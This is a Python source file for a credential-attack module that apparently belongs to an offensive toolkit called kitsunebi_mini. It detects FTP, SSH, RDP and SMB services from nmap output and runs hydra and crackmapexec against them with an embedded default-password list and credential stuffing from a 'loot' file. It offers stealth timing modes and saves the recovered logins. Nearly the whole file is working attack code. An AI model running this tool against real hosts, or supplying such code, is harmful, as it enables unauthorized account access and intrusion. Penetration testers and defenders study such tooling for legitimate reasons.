#!/usr/bin/env python3
"""
dc_creds.py — Credential attack module for kitsunebi_mini
Targets: FTP, RDP, SSH, SMB
Modes:   default/common creds | credential stuffing from loot file
Offline: no internet required — all wordlists are embedded or local

Requires: hydra (FTP/SSH/RDP), crackmapexec or hydra smb (SMB)
"""

import os, re, json, subprocess, shutil, tempfile, secrets
from pathlib import Path

# ── Embedded default credential list (offline-safe) ──────────────────────────
DEFAULT_CREDS = [
    "admin:admin","admin:password","admin:1234","admin:12345","admin:123456",
    "admin:","admin:Password1","admin:Admin123","root:root","root:toor",
    "root:password","root:","root:alpine","guest:guest","guest:",
    "user:user","user:password","administrator:administrator",
    "administrator:password","administrator:Password1","administrator:Admin1234",
    "test:test","test:password","ftp:ftp","anonymous:anonymous","anonymous:",
    "pi:raspberry","ubuntu:ubuntu","vagrant:vagrant","service:service",
    "support:support","operator:operator","netadmin:netadmin","cisco:cisco",
    "cisco:admin","sa:","sa:sa","postgres:postgres","mysql:mysql","oracle:oracle",
]

SERVICE_PORTS = {
    "ftp": [21], "ssh": [22], "rdp": [3389], "smb": [445, 139],
}

NMAP_SERVICE_MAP = {
    "ftp": "ftp", "ftp-data": "ftp",
    "ssh": "ssh", "openssh": "ssh",
    "microsoft-ds": "smb", "netbios-ssn": "smb",
    "ms-wbt-server": "rdp", "rdp": "rdp",
}

HYDRA_MODULE = {"ftp": "ftp", "ssh": "ssh", "rdp": "rdp"}

# Mode → (hydra threads, timeout secs, jitter secs)
MODE_PARAMS = {1: ("2", 600, 5), 2: ("4", 480, 3), 3: ("8", 300, 1), 4: ("16", 180, 0)}

# ── Helpers ───────────────────────────────────────────────────────────────────

def avail(tool: str) -> bool:
    return bool(shutil.which(tool))

def write_file(lines: list[str], path: str):
    Path(path).write_text("\n".join(lines))

def load_loot(loot_path: str) -> list[str]:
    """Parse a loot file for user:pass pairs. Skips bare hashes."""
    if not os.path.exists(loot_path):
        print(f"[!] Loot file not found: {loot_path}")
        return []
    creds = []
    with open(loot_path, errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if re.match(r"^[a-fA-F0-9]{32,}$", line):   # skip raw hashes
                continue
            m = re.search(r"(\S+)\s*/\s*(\S+)", line)    # "user / pass" format
            if m:
                creds.append(f"{m.group(1)}:{m.group(2)}")
                continue
            if ":" in line:
                u, p = line.split(":", 1)
                if len(p) <= 64:                          # skip long hash values
                    creds.append(line)
    deduped = list(dict.fromkeys(creds))
    print(f"[+] Loaded {len(deduped)} credential pairs from loot")
    return deduped

def parse_hydra(path: str, service: str, port: int) -> list[dict]:
    if not os.path.exists(path):
        return []
    results = []
    with open(path, errors="ignore") as f:
        for line in f:
            m = re.search(r"login:\s*(\S*)\s+password:\s*(.*)", line)
            if m:
                results.append({"user": m.group(1), "password": m.group(2).strip(),
                                 "service": service, "port": port})
    return results

def save_results(target: str, results: list[dict]) -> str:
    outdir = Path.home() / ".dc_reports"
    outdir.mkdir(mode=0o700, exist_ok=True)
    fn = outdir / f"{secrets.token_hex(8)}_creds.json"
    fn.write_text(json.dumps({"target": target, "credentials": results}, indent=2))
    fn.chmod(0o600)
    return str(fn)

# ── Attack functions ──────────────────────────────────────────────────────────

def hydra_attack(target: str, service: str, port: int,
                 cred_file: str, mode: int, tmpdir: str) -> list[dict]:
    if not avail("hydra"):
        print("[!] hydra missing — skipping"); return []
    threads, timeout, _ = MODE_PARAMS[mode]
    out = os.path.join(tmpdir, f"hydra_{service}_{port}.txt")
    # Force 4 threads max for RDP (protocol fragility)
    t = "4" if service == "rdp" else threads
    args = ["hydra", "-C", cred_file, "-s", str(port), "-t", t,
            "-o", out, "-q", target, HYDRA_MODULE[service]]
    print(f"[+] {' '.join(args)}")
    try:
        subprocess.run(args, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=timeout)
    except subprocess.TimeoutExpired:
        print(f"[!] hydra timed out on {service}:{port}")
    return parse_hydra(out, service, port)

def cme_attack(target: str, port: int, cred_file: str,
               mode: int, tmpdir: str) -> list[dict]:
    cme = next((t for t in ["crackmapexec", "cme"] if avail(t)), None)
    if not cme:
        print("[!] crackmapexec/cme missing — falling back to hydra smb")
        return hydra_attack(target, "smb", port, cred_file, mode, tmpdir)

    pairs = [l.strip() for l in Path(cred_file).read_text().splitlines() if ":" in l]
    users = list(dict.fromkeys(p.split(":")[0] for p in pairs))
    passs = list(dict.fromkeys(p.split(":", 1)[1] for p in pairs))
    u_file = os.path.join(tmpdir, "smb_u.txt")
    p_file = os.path.join(tmpdir, "smb_p.txt")
    write_file(users, u_file); write_file(passs, p_file)

    _, timeout, jitter = MODE_PARAMS[mode]
    args = [cme, "smb", target, "-u", u_file, "-p", p_file,
            "--no-bruteforce", "--continue-on-success"]
    if jitter:
        args += ["--jitter", str(jitter)]
    print(f"[+] {' '.join(args)}")

    results = []
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        for line in r.stdout.splitlines():
            if "[+]" in line:
                m = re.search(r"\\(\S+)\s+(\S+)(?:\s|$)", line)
                if m:
                    results.append({"user": m.group(1), "password": m.group(2),
                                    "service": "smb", "port": port})
    except subprocess.TimeoutExpired:
        print(f"[!] crackmapexec timed out on smb:{port}")
    return results

# ── Service detection ─────────────────────────────────────────────────────────

def detect_services(nmap_output: str) -> list[dict]:
    found, seen = [], set()
    for line in nmap_output.splitlines():
        m = re.search(r"(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
        if not m:
            continue
        port, svc_raw = int(m.group(1)), m.group(3).lower()
        canonical = NMAP_SERVICE_MAP.get(svc_raw)
        if not canonical:
            for svc, ports in SERVICE_PORTS.items():
                if port in ports:
                    canonical = svc; break
        if canonical and (canonical, port) not in seen:
            seen.add((canonical, port))
            found.append({"service": canonical, "port": port})
    return found

# ── Main entry point (called by kitsunebi_mini or standalone) ────────────────

def run_creds(target: str, mode: int, nmap_output: str,
              loot_path: str | None = None) -> list[dict]:
    services = [s for s in detect_services(nmap_output) if s["service"] in SERVICE_PORTS]
    if not services:
        print("[~] No targetable services (FTP/SSH/RDP/SMB) — skipping creds")
        return []

    print(f"\n[+] Credential targets: "
          + ", ".join(f"{s['service']}:{s['port']}" for s in services))

    # Loot creds first (range-likely hits), then defaults
    loot = load_loot(loot_path) if loot_path else []
    if not loot_path:
        print("[~] No loot file — using default/common credentials only")
    defaults = [c for c in DEFAULT_CREDS if c not in loot]
    all_creds = loot + defaults

    all_results = []
    with tempfile.TemporaryDirectory() as tmpdir:
        os.chmod(tmpdir, 0o700)
        cred_file = os.path.join(tmpdir, "creds.txt")
        write_file(all_creds, cred_file)

        for svc in services:
            service, port = svc["service"], svc["port"]
            print(f"\n[+] Attacking {service}:{port}…")
            results = (cme_attack(target, port, cred_file, mode, tmpdir)
                       if service == "smb"
                       else hydra_attack(target, service, port, cred_file, mode, tmpdir))
            if results:
                print(f"[!] {len(results)} hit(s) on {service}:{port}")
                for r in results:
                    print(f"    ✓  {r['user']}:{r['password']}")
            else:
                print(f"[-] No credentials found on {service}:{port}")
            all_results.extend(results)

    if all_results:
        fn = save_results(target, all_results)
        print(f"\n[+] Credentials saved → {fn}")

    return all_results

# ── Standalone ────────────────────────────────────────────────────────────────

def standalone():
    print("\n[dc_creds] Standalone mode")
    target = input("Target IP: ").strip()
    if not target:
        return print("[!] No target.")

    print("Enter open services (blank to finish). Format: service:port")
    print("Supported: ftp:21  ssh:22  smb:445  rdp:3389")
    lines = []
    while True:
        entry = input("  > ").strip()
        if not entry: break
        m = re.match(r"(\w+):(\d+)", entry)
        if m: lines.append(f"{m.group(2)}/tcp open {m.group(1)}")
        else: print("  [!] Bad format")

    loot = input("Loot file path (blank to skip): ").strip() or None
    print("\n1=Ghost  2=Sneaky  3=YOLO  4=BOSS")
    try:   mode = int(input("Mode [1-4]: ").strip())
    except ValueError: return print("[!] Invalid mode")
    if mode not in range(1, 5): return print("[!] Invalid mode")

    results = run_creds(target, mode, "\n".join(lines), loot)
    print(f"\n[{'!' if results else '-'}] {len(results)} total credential(s) recovered.")

if __name__ == "__main__":
    standalone()
